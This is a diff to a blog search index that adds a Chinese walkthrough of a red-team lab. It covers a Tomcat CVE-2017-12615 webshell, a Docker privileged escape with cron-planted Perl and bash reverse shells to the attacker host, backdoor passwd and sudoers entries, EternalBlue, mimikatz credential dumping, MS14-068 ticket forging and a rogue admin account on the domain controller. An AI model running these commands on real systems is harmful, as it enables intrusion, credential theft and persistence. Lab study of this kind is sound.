@@ -2709,7 +2709,7 @@
 
 
 <p>使用IPC命令将后门文件复制到win32</p>
-<p>copy beacon 192.168.52.141\admin$</p>
+<p>copy beacon.exe 192.168.52.141\admin$</p>
 <p>设置定时任务</p>
 <p>at \\192.168.52.141 11:16 beacon.exe</p>
 <img src="/2024/03/12/ATTCK1/image-20240312120158264.png" class="" title="image-20240312120158264">
@@ -2724,6 +2724,278 @@
 <img src="/2024/03/12/ATTCK1/image-20240312113424011.png" class="" title="image-20240312113424011">
 
 <p>此时Win2K3也已经成功拿下</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ATTCK4</title>
+    <url>/2024/03/20/ATTCK4/</url>
+    <content><![CDATA[<p>win7</p>
+<p>douser &#x2F; Dotest123</p>
+<p>web</p>
+<p>ubuntu&#x2F;ubuntu</p>
+<p>DC</p>
+<p>administrator:Test2008</p>
+<p>1qaz!QAZ</p>
+<p>启动docker</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker start ec 17 09 bb da 3d ab ad</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313120840471.png" class="" title="image-20240313120840471">
+
+
+
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.6.195</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313153253043.png" class="" title="image-20240313153253043">
+
+
+
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p><strong>Tomcat任意写入文件漏洞（CVE-2017-12615）</strong></p>
+<p>哥斯拉生成木马</p>
+<img src="/2024/03/20/ATTCK4/image-20240313161728991.png" class="" title="image-20240313161728991">
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313161710462.png" class="" title="image-20240313161710462">
+
+<p>连接成功</p>
+<img src="/2024/03/20/ATTCK4/image-20240313161809260.png" class="" title="image-20240313161809260">
+
+
+
+<p>进入终端，发现为docker环境</p>
+<img src="/2024/03/20/ATTCK4/image-20240313162007877.png" class="" title="image-20240313162007877">
+
+
+
+<h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p><strong>Docker Privileged特权逃逸</strong></p>
+<p>操作者使用特权模式启动的容器时，Docker管理员可以通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p>
+<p>在容器中时可以通过如下参数检测当前容器是否是以特权模式启动:</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat /proc/self/status | grep <span class="title class_">CapEff</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是以特权模式启动的话，CapEff对应的掩码值为0000003fffffffff</p>
+<img src="/2024/03/20/ATTCK4/image-20240313165345144.png" class="" title="image-20240313165345144">
+
+
+
+<p>方法一</p>
+<p>查看挂载磁盘设备</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+
+<p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>
+
+<p>设置定时任务</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">echo $&#x27;*/<span class="number">1</span> * * * * perl -e \&#x27;use Socket;$i=<span class="string">&quot;192，168，6，142&quot;</span>;$p=<span class="number">2333</span>;socket(S<span class="punctuation">,</span>PF_INET<span class="punctuation">,</span>SOCK_STREAM<span class="punctuation">,</span>getprotobyname(<span class="string">&quot;tcp&quot;</span>));if(connect(S<span class="punctuation">,</span>sockaddr_in($p<span class="punctuation">,</span>inet_aton($i))))<span class="punctuation">&#123;</span>open(STDIN<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);<span class="punctuation">&#125;</span>;\&#x27;&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure>
+
+<p>通过新添加的用户登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /mnt</span><br><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">ls /mnt</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addedsalt&quot;)&#x27;</span><br><span class="line">echo &quot;aaa:adrla7IBSfTZQ:1003:1003:ub:/root:/bin/bash&quot; &gt;&gt;/mnt/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>其实这个文件有很多条信息，我只单独列出这两条。很清晰的看到每条信息由7个字段组成，由:隔开。<br>字段包含如下信息：<br>1️⃣ 登录用户名<br>2️⃣ 用户密码（进行了别的处理，这里x简单表示，加密后存储在&#x2F;etc&#x2F;shadow文件中）<br>3️⃣ 用户账户的UID（数字形式）<br>4️⃣ 用户账户的组ID（GID）（数字形式）<br>5️⃣ 用户账户的文本描述（称为备注字段）<br>6️⃣ 用户HOME目录位置<br>7️⃣ 用户的默认shell</p>
+<img src="/2024/03/20/ATTCK4/image-20240313174530313.png" class="" title="image-20240313174530313">
+
+<p>ssh连接</p>
+<img src="/2024/03/20/ATTCK4/image-20240313174639091.png" class="" title="image-20240313174639091">
+
+<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;aaa ALL=(ALL:ALL) ALL&quot; &gt;&gt; /mnt/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313203847644.png" class="" title="image-20240313203847644">
+
+<p>当用户执行sudo时，系统会主动寻找&#x2F;etc&#x2F;sudoers文件，判断该用户是否有执行sudo的权限<br>–&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认<br>–&gt;若密码输入成功，则开始执行sudo后续的命令</p>
+<p>1.root执行sudo时不需要输入密码(sudoers文件中有配置root ALL&#x3D;(ALL) ALL这样一条规则)<br>2.欲切换的身份与执行者的身份相同，不需要输入密码<br>3.&#x2F;etc&#x2F;sudoers文件设置为允许用户在不输入该用户的密码的情况下使用所有命令<br>如设置允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令<br>wheel        ALL&#x3D;(ALL)       NOPASSWD: ALL</p>
+<p>提权成功</p>
+<img src="/2024/03/20/ATTCK4/image-20240313203911492.png" class="" title="image-20240313203911492">
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.6.142/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload cmd/unix/reverse_bash</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313204416561.png" class="" title="image-20240313204416561">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回到后台</span><br><span class="line">background</span><br><span class="line"># 升级会话</span><br><span class="line">sessions -u 1</span><br><span class="line"># 进入meterpreter会话</span><br><span class="line">sessions 2</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313204708141.png" class="" title="image-20240313204708141">
+
+
+
+<h1 id="域主机渗透"><a href="#域主机渗透" class="headerlink" title="域主机渗透"></a><strong>域主机渗透</strong></h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>添加路由</p>
+<p>第一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add 192.168.183.0 255.255.255.0 2</span><br></pre></td></tr></table></figure>
+
+<p>第二种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313211411158.png" class="" title="image-20240313211411158">
+
+
+
+
+
+<p>内网进行主机发现和端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp </span><br><span class="line">set session 2</span><br><span class="line">set rhosts 192.168.183.0/24</span><br><span class="line">set ports 139,445,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240314082221603.png" class="" title="image-20240314082221603">
+
+
+
+<p>内网主机均开启了 139，445端口</p>
+<p>192.168.183.129(win7)</p>
+<p>192.168.183.130(DC)</p>
+<h2 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h2><p>1、端口445：SMB协议的主要通信端口。在现代版本的Windows操作系统中，SMB协议的通信主要通过TCP&#x2F;IP协议在端口445上进行。端口445上的SMB通信提供了更高的安全性和功能，包括对加密和身份验证的支持。</p>
+<p>2、端口139：早期版本的SMB协议通常在端口139上进行通信。它是NetBIOS Session Service的默认端口，用于在Windows网络上建立会话和进行文件共享。但是，端口139上的SMB通信缺乏加密和身份验证的支持，存在安全风险。因此，在现代网络环境中，推荐使用端口445进行SMB通信。</p>
+<p><strong>建立代理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.toml </span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314113731400.png" class="" title="image-20240314113731400">
+
+<p>ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.6.142</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.183.128</span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:192.168.6.142:7777</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lhost 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313214838880.png" class="" title="image-20240313214838880">
+
+
+
+<p>获得明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码:</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240314144601087.png" class="" title="image-20240314144601087">
+
+
+
+<h1 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h1><p><strong>快速检测目标系统未打漏洞补丁</strong></p>
+<p><strong>内核漏洞提权</strong> </p>
+<table>
+<thead>
+<tr>
+<th align="left">漏洞代号</th>
+<th align="left">补丁编号</th>
+<th align="left">适用平台</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">MS14-058</td>
+<td align="left">KB3000061</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS14-068</td>
+<td align="left">KB3011780</td>
+<td align="left">域控未安装补丁的域内，03，08，12</td>
+<td align="left">域内提权</td>
+</tr>
+<tr>
+<td align="left">MS15-051</td>
+<td align="left">KB3057191</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS16-032</td>
+<td align="left">KB3143141</td>
+<td align="left">08 r2以后，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS17-010</td>
+<td align="left">KB4013389</td>
+<td align="left">03，08，12，16，win7</td>
+<td align="left">远程注入dll</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-0787</td>
+<td align="left"></td>
+<td align="left">all</td>
+<td align="left">windows全版本提权</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-1472</td>
+<td align="left"></td>
+<td align="left">domain</td>
+<td align="left">域内提权</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo &gt; temp.txt&amp;(for %i in (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314144837576.png" class="" title="image-20240314144837576">
+
+<p>获得账号密码 sid 域控名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314163308073.png" class="" title="image-20240314163308073">
+
+<p>利用Kerberos 域用户提权漏洞（MS14-068;CVE-2014-6324)来获得域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314160900297.png" class="" title="image-20240314160900297">
+
+
+
+
+<p><code>mimikatz # kerberos::ptc TGT_douser@demo.com.ccache</code> 导入票据</p>
+<img src="/2024/03/20/ATTCK4/image-20240314163005819.png" class="" title="image-20240314163005819">
+
+
+
+
+
+<p>成功连接到2008域控，并查看域控c盘</p>
+<p>dir \WIN-ENS2VR5TR3N\C$</p>
+<img src="/2024/03/20/ATTCK4/image-20240314163114678.png" class="" title="image-20240314163114678">
+
+<p><strong>使用PsExec工具获取shell &#x2F;&#x2F;PsExec64.exe以管理员权限运行连接域控远程桌面连接</strong></p>
+<p>msf用ms17-010可以直接打通DC</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp *#开启远程桌面服务*</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314163638043.png" class="" title="image-20240314163638043">
+
+<p>添加用户 远程桌面连接即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user cyy 1qazQAZ /add</span><br><span class="line">net localgroup administrators cyy /add</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop 192.168.183.130:3389  </span><br></pre></td></tr></table></figure>
+
+
+
+
+
 ]]></content>
   </entry>
 </search>
